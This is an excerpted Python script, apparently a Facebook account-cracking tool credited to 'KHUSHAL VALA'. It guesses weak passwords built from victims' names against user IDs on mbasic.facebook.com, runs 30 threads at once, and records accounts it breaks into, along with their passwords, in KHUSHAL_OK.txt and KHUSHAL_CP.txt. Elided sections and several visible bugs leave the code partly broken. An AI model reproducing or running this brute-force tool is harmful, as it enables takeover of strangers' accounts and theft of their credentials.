...
from concurrent.futures import ThreadPoolExecutor as khushalkrv
...
\x1b[1;97m------------------------\x1b[1;97m------------------------
\033[1;31m\033[1;37m Author \x1b[1;97m : \033[1;37m           KHUSHAL VALA
\033[1;31m\033[1;37m Facebook\x1b[1;97m:  \033[1;37m          Www.facebook.com/Vala.khushal.75
\033[1;31m\033[1;37m GitHub\x1b[1;97m  : \033[1;37m           https://github.com/KhushalVala
\033[1;31m\033[1;37m YouTube\x1b[1;97m  : \033[1;37mhttps://youtube.com/channel/UCbJ0xeLBVqkMAC6FuCBsMCQ
\033[1;31m\033[1;37m Version\x1b[1;97m : \033[1;37m             6.2.2
\033[1;37m------------------------\033[1;37m------------------------ """                                              
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mKHUSHAL_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mKHUSHAL_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back KHUSHAL Menu ")
	    khushal()
...
def khushal():
    ...
    print(' [E] exit ')
    print('')
    _khushal___ = input(' [?] Choose option : ')
    if _khushal___ in ('1', '01'):
        __xxx__().khushalx(id)
    if _khushal___ in ('2', '02'):
        os.system('python dm.py')
    if _khushal___ in ('E', 'ee'):
        pass
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[KHUSHAL] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [KHUSHAL-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('KHUSHAL_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [KHUSHAL-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('KHUSHAL_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            print(47*"-")
            with khushalkrv(max_workers=30) as krvworld:
                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            ...
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                            pwx = ["786110"]
                        krvworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif chi in ('2', '02'):
...
def bnsreg():
    ...
    print
    id = str(uuid.uuid1(uuid.getnode(),0))[24:].upper() + "~KRV=="
    print
